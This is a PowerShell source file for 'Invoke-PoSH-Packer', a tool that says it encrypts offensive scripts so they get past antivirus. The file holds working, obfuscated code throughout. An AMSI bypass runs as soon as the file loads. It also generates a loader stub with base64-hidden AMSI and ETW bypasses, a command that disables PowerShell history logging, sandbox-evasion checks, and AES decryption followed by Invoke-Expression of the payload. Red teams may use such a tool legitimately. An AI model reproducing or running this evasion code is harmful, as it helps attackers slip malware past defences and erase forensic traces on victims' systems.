# ==================================================================================================================
# 'Invoke-PoSH-Packer' allows to pack and encrypt offensive PowerShell scripts in order to bypass AV solutions
# Author: https://github.com/Jean-Francois-C / GNU General Public License v3.0
# ==================================================================================================================
# Features:
# - AES encryption and GZip/Deflate compression (based on 'Xencrypt')
# - AMSI bypass
# - Blocking Event Tracing for Windows (ETW)
# - Disabling PowerShell history logging
# - Basic sandbox evasion techniques (optional -sandbox)
# ==================================================================================================================
# Usage: 
# > Import-Module ./Invoke-PoSH-Packer.ps1
# > Invoke-PoSH-Packer -FileUrl https://URL/script.ps1 -OutFile C:\path\Packed-script.ps1
# > Invoke-PoSH-Packer -FilePath C:\path\script.ps1 -OutFile C:\path\Packed-script.ps1
# ================================================================================================================== 

Write-Output "
  ___     ___ _  _     ___         _           
 | _ \___/ __| || |___| _ \___  __| |_____ _ _ 
 |  _/ _ \__ \ __ |___|  _/ _ |/ _| / / -_) '_|
 |_| \___/___/_||_|   |_| \__,|\__|_\_\___|_|  
                                             v1.2
Usage: 
> Invoke-PoSH-Packer -FileUrl https://URL/script.ps1 -OutFile C:\path\Packed-script.ps1
> Invoke-PoSH-Packer -FilePath C:\path\script.ps1 -OutFile C:\path\Packed-script.ps1

Features:
[*] AES encryption and GZip/Deflate compression (based on 'Xencrypt')
[*] AMSI bypass
[*] Blocking Event Tracing for Windows (ETW)
[*] Disabling PowerShell history logging
[*] Basic sandbox evasion techniques (optional -sandbox)
"

# 'A'M'S'I' bypass to be able to download the offensive PowerShell scripts that we want to encrypt/obfuscate
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].ASSeMBly.GEtTYPe(("{5}{2}{0}{1}{3}{6}{4}" -f 'ut',('o'+'ma'+'t'+''+'ion.'),'.A',('Am'+''+'s'+'iU'+'t'+''),'ls',('S'+'yste'+'m.'+'M'+'anag'+'e'+'men'+'t'),'i')).GEtFieLd(("{2}{0}{1}" -f 'i',('Co'+'n'+'text'),('am'+'s')),[Reflection.BindingFlags]("{4}{2}{3}{0}{1}" -f('b'+'lic,Sta'+'ti'),'c','P','u',('N'+'on'))).GEtVaLUe($null),0x41414141);

function Invoke-PoSH-Packer {

    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $filepath,
		 
	[Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $fileurl,
	
	[Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [switch] $sandbox,
	
        [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $outfile = $(Throw("-OutFile is required"))
	)
	
    Process {
		 
	if ($filepath) {	
	Write-Output "[*] Loading the local file: '$($filepath)'"
        $codebytes = [System.IO.File]::ReadAllBytes($filepath)
	}
	elseif ($fileurl){
	Write-Output "[*] Downloading the remote file: '$($fileurl)'"
        $Webclient = [Net.WebRequest]::Create($fileurl)
        $Webclient.Proxy = [Net.WebRequest]::GetSystemWebProxy()
        $Webclient.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
        $Webclient.UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'
        $response = $Webclient.GetResponse()
        $respStream = $response.GetResponseStream()
        $buffer = New-Object byte[] $response.ContentLength
        $writeStream = New-Object IO.MemoryStream $response.ContentLength
        do {
            $bytesRead = $respStream.Read($buffer, 0, $buffer.Length)
            $writeStream.Write($buffer, 0, $bytesRead)
        }
        while ($bytesRead -gt 0)
        $codebytes = New-Object byte[] $response.ContentLength
        [Array]::Copy($writeStream.GetBuffer(), $codebytes, $response.ContentLength)
        $respStream.Close()
        $response.Close()
		}
		else {
        Write-Error "Either FilePath or FileUrl parameter must be specified" -ErrorAction Stop
		}

        $paddingmodes = 'PKCS7','ISO10126','ANSIX923','Zeros'
        $paddingmode = $paddingmodes | Get-Random
        $ciphermodes = 'ECB','CBC'
        $ciphermode = $ciphermodes | Get-Random

        $keysizes = 128,192,256
        $keysize = $keysizes | Get-Random

        $compressiontypes = 'Gzip','Deflate'
        $compressiontype = $compressiontypes | Get-Random

        Write-Output "[*] File compression (GZip)"
        [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
        if ($compressiontype -eq "Gzip") {
            $compressionStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
        } elseif ( $compressiontype -eq "Deflate") {
            $compressionStream = New-Object System.IO.Compression.DeflateStream $output, ([IO.Compression.CompressionMode]::Compress)
        }
      	    $compressionStream.Write( $codebytes, 0, $codebytes.Length )
        $compressionStream.Close()
        $output.Close()
        $compressedBytes = $output.ToArray()

        $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
        if ($ciphermode -eq 'CBC') {
            $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        } elseif ($ciphermode -eq 'ECB') {
            $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::ECB
        }

        if ($paddingmode -eq 'PKCS7') {
            $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        } elseif ($paddingmode -eq 'ISO10126') {
            $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::ISO10126
        } elseif ($paddingmode -eq 'ANSIX923') {
            $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::ANSIX923
        } elseif ($paddingmode -eq 'Zeros') {
            $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        }

        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
        $aesManaged.GenerateKey()
        $b64key = [System.Convert]::ToBase64String($aesManaged.Key)

        Write-Output "[*] File encryption (AES)"
        $encryptor = $aesManaged.CreateEncryptor()
        $encryptedData = $encryptor.TransformFinalBlock($compressedBytes, 0, $compressedBytes.Length);
        [byte[]] $fullData = $aesManaged.IV + $encryptedData
        $aesManaged.Dispose()
        $b64encrypted = [System.Convert]::ToBase64String($fullData)
        
        $stub_template = ''
        
	if ($sandbox) {	
        Write-Output "[*] Adding basic sandbox checks"
        $code_fixed_order1 += '${17} = "aWYgKFQnZSdzJ3QnLVBBdEggVmFyJ2knYSdiJ2xlOlBTJ0QnZSdiJ3VnQ09OdGVYdCkge"' + "`r`n"
	$stub_template += $code_fixed_order1 -join ''
	$code_fixed_order2 += '${18} = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(${17}+"2V4aXR9IGVsc2Uge1MndCdhJ1JULVNsRSdFcCAtcyA2MH07"))' + "`r`n"
        $stub_template += $code_fixed_order2 -join ''
        $code_fixed_order3 += "iN'v'Oke-exPReS'S'iOn"+'(${18})' + "`r`n"
        $stub_template += $code_fixed_order3 -join ''
        }
		
        Write-Output "[*] Adding 'A'M'S'I' bypass"
        $code_fixed_order4 += '${9} = "JGJ5cCA9IFtSZWZdLkFzc2VtYmx5LkdldFR5cGVzKCk7Rm9yRWFjaCgkYmEgaW4gJGJ5cCkge2lmICgkYmEuTmFtZSAtbGlrZSAiKml1dGlscyIpIHskY2EgPSAkYmF9fTskZGEgPSAkY2EuR2V0RmllbG"' + "`r`n"
        $stub_template += $code_fixed_order4 -join ''
        $code_fixed_order5 += '${10} = "RzKCdOb25QdWJsaWMsU3RhdGljJyk7Rm9yRWFjaCgkZWEgaW4gJGRhKSB7aWYgKCRlYS5OYW1lIC1saWtlICIqaXRGYWlsZWQiKSB7JGZhID0gJGVhfX07JGZhLlNldFZhbHVlKCRudWxsLCR0cnVlKTsK"' + "`r`n"
        $stub_template += $code_fixed_order5 -join ''
	$code_fixed_order6 += '${11} = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(${9}+${10}))' + "`r`n"
        $stub_template += $code_fixed_order6 -join ''
        $code_fixed_order7 += "iN'v'Oke-exPReS'S'iOn"+'(${11})' + "`r`n"
        $stub_template += $code_fixed_order7 -join ''
        
        Write-Output "[*] Adding 'E'T'W' bypass" 
	$code_fixed_order8 += '${12} = "R5cGUoJ1N5c3RlbS5NYW5hJysnZ2VtZW50LkF1dG8nKydtYXRpb24uVHJhY2luZy5QU0V0Jysnd0xvZ1ByJysnb3ZpZGVyJykuR0V0RmllTEQoJ2V0Jysnd1Byb3YnKydpZGVyJywnTm9uUCcrJ3VibGljLFN0YXRpYycpLkdlVFZhTHVlKCRudWxsKSwwKQ=="' + "`r`n"
        $stub_template += $code_fixed_order8 -join ''
        $code_fixed_order9 += '${13} = "W1JlZmxlQ3RpT04uQXNzRU1ibHldOjpMT0FkV2l0aFBBUnRpYWxOYU1lKCdTeXN0ZW0uQ29yZScpLkdlVFRZUGUoJ1N5c3QnKydlbS5EaWFnbicrJ29zdGljcy5FdmUnKydudGluZy5FdmVuJysndFByb3ZpZGVyJykuR2V0RmllbGQoJ21fZW5hYmxlZCcsJ05vblB1YmxpYyxJbnN0YW5jZScpLlNldFZhbHVlKFtSZWZdLkFzU0VtYkxZLkdldF"' + "`r`n"
        $stub_template += $code_fixed_order9 -join ''
        $code_fixed_order10 += '${14} = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(${13}+${12})))' + "`r`n"
        $stub_template += $code_fixed_order10 -join ''
        $code_fixed_order11 += "iN'v'Oke-exPReS'S'iOn"+'(${14})' + "`r`n"
        $stub_template += $code_fixed_order11 -join ''
        
        Write-Output "[*] Disabling PoSh history logging"
        $code_fixed_order12 += '${15} = "U2V0LVBTUmVBZExJbmVPcFRpb24g"' + "`r`n"
        $stub_template += $code_fixed_order12 -join ''
        $code_fixed_order13 += '${16} = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(${15}+"LUhpc3RvcnlTYXZlU3R5bGUgU2F2J2VOJ290aCdpbidn")))' + "`r`n"
        $stub_template += $code_fixed_order13 -join ''
        $code_fixed_order14 += "iN'v'Oke-exPReS'S'iOn"+'(${16})' + "`r`n"
        $stub_template += $code_fixed_order14 -join ''

        $code_alternatives  = @()
        $code_alternatives += '${2} = [System.Convert]::FromBase64String("{0}")' + "`r`n"
        $code_alternatives += '${3} = [System.Convert]::FromBase64String("{1}")' + "`r`n"
        $code_alternatives += '${4} = New-Object "System.Security.Cryptography.AesManaged"' + "`r`n"
        $code_alternatives_shuffled = $code_alternatives | Sort-Object {Get-Random}
        $stub_template += $code_alternatives_shuffled -join ''
        
        $code_alternatives  = @()
        $code_alternatives += '${4}.Mode = [System.Security.Cryptography.CipherMode]::'+$ciphermode + "`r`n"
        $code_alternatives += '${4}.Padding = [System.Security.Cryptography.PaddingMode]::'+$paddingmode + "`r`n"
        $code_alternatives += '${4}.BlockSize = 128' + "`r`n"
        $code_alternatives += '${4}.KeySize = '+$keysize + "`n" + '${4}.Key = ${3}' + "`r`n"
        $code_alternatives += '${4}.IV = ${2}[0..15]' + "`r`n"
        $code_alternatives_shuffled = $code_alternatives | Sort-Object {Get-Random}
        $stub_template += $code_alternatives_shuffled -join ''

        $code_alternatives  = @()
        $code_alternatives += '${6} = New-Object System.IO.MemoryStream(,${4}.CreateDecryptor().TransformFinalBlock(${2},16,${2}.Length-16))' + "`r`n"
        $code_alternatives += '${7} = New-Object System.IO.MemoryStream' + "`r`n"
        $code_alternatives_shuffled = $code_alternatives | Sort-Object {Get-Random}
        $stub_template += $code_alternatives_shuffled -join ''

        if ($compressiontype -eq "Gzip") {
            $stub_template += '${5} = New-Object System.IO.Compression.GzipStream ${6}, ([IO.Compression.CompressionMode]::Decompress)'    + "`r`n"
        } elseif ( $compressiontype -eq "Deflate") {
            $stub_template += '${5} = New-Object System.IO.Compression.DeflateStream ${6}, ([IO.Compression.CompressionMode]::Decompress)' + "`r`n"
        }
        $stub_template += '${5}.CopyTo(${7})' + "`r`n"

        $code_alternatives  = @()
        $code_alternatives += '${5}.Close()' + "`r`n"
        $code_alternatives += '${4}.Dispose()' + "`r`n"
        $code_alternatives += '${6}.Close()' + "`r`n"
        $code_alternatives += '${8} = [System.Text.Encoding]::UTF8.GetString(${7}.ToArray())' + "`r`n"
        $code_alternatives_shuffled = $code_alternatives | Sort-Object {Get-Random}
        $stub_template += $code_alternatives_shuffled -join ''

        $stub_template += ('Invoke-Expression','IEX' | Get-Random)+'(${8})' + "`r`n"
        
        $code = $stub_template -f $b64encrypted, $b64key, (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var)
        $codebytes = [System.Text.Encoding]::UTF8.GetBytes($code)
        
        Write-Output "[*] Writing the obfuscated & encrypted PowerShell script: '$($outfile)' ..."
        [System.IO.File]::WriteAllText($outfile,$code)
        Write-Output "[+] Done!"
	}
}

function Create-Random-Var() {
        $set = "abcdefghijkmnopqrstuvwxyzABCDEFGHIJKLMNOP0123456789"
        (1..(4 + (Get-Random -Maximum 8)) | %{ $set[(Get-Random -Minimum 1 -Maximum $set.Length)] } ) -join ''
}
